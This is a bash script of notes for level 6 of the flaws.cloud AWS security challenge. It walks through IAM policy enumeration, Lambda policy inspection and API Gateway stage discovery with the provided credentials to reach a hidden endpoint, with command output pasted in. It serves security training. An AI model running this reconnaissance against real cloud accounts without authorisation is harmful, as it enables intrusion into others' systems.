#!/bin/bash
# http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/

curl http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/
aws configure --profile flawsL6
# put in the creds you straight up get given this time

aws iam get-user --profile flawsL6
:'{
    "User": {
        "Path": "/",
        "UserName": "Level6",
        "UserId": "AIDAIRMDOSCWGLCDWOG6A",
        "Arn": "arn:aws:iam::975426262029:user/Level6",
        "CreateDate": "2017-02-26T23:11:16Z"
    }
}'
aws --profile flawsL6 iam list-attached-user-policies --user-name Level6
:'{
    "AttachedPolicies": [
        {
            "PolicyName": "list_apigateways",
            "PolicyArn": "arn:aws:iam::975426262029:policy/list_apigateways"
        },
        {
            "PolicyName": "MySecurityAudit",
            "PolicyArn": "arn:aws:iam::975426262029:policy/MySecurityAudit"
        }
    ]
}'

aws --profile flawsL6 iam get-policy  --policy-arn arn:aws:iam::975426262029:policy/list_apigateways
: '{
    "Policy": {
        "PolicyName": "list_apigateways",
        "PolicyId": "ANPAIRLWTQMGKCSPGTAIO",
        "Arn": "arn:aws:iam::975426262029:policy/list_apigateways",
        "Path": "/",
        "DefaultVersionId": "v4",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "List apigateways",
        "CreateDate": "2017-02-20T01:45:17Z",
        "UpdateDate": "2017-02-20T01:48:17Z"
    }
}'

aws --profile flawsL6 iam get-policy-version  --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4
:'{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": [
                        "apigateway:GET"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:apigateway:us-west-2::/restapis/*"
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
        "CreateDate": "2017-02-20T01:48:17Z"
    }
}'

aws apigateway get-rest-apis --profile flawsL6 
#access denied :(

aws --region us-west-2 --profile flawsL6 lambda list-functions
:'
{
    "Functions": [
        {
            "FunctionName": "Level6",
            "FunctionArn": "arn:aws:lambda:us-west-2:975426262029:function:Level6",
            "Runtime": "python2.7",
            "Role": "arn:aws:iam::975426262029:role/service-role/Level6",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 282,
            "Description": "A starter AWS Lambda function.",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2017-02-27T00:24:36.054+0000",
            "CodeSha256": "2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "98033dfd-defa-41a8-b820-1f20add9c77b"
        }
    ]
}'

aws --region us-west-2 --profile flawsL6 lambda get-policy --function-name Level6
:'{
    "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"904610a93f593b76ad66ed6ed82c0a8b\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"apigateway.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:us-west-2:975426262029:function:Level6\",\"Condition\":{\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\"}}}]}",
    "RevisionId": "98033dfd-defa-41a8-b820-1f20add9c77b"
}'
#rest api id = s33ppypa75
# s33ppypa75/*/GET/level6

aws --profile flawsL6 --region us-west-2 apigateway get-stages --rest-api-id "s33ppypa75"
:'{
    "item": [
        {
            "deploymentId": "8gppiv",
            "stageName": "Prod",
            "cacheClusterEnabled": false,
            "cacheClusterStatus": "NOT_AVAILABLE",
            "methodSettings": {},
            "tracingEnabled": false,
            "createdDate": 1488155168,
            "lastUpdatedDate": 1488155168
        }
    ]
}'

# so: 
#execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\
# "stageName": "Prod",
# builds to uri
curl https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6

:'"Go to http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/"% '
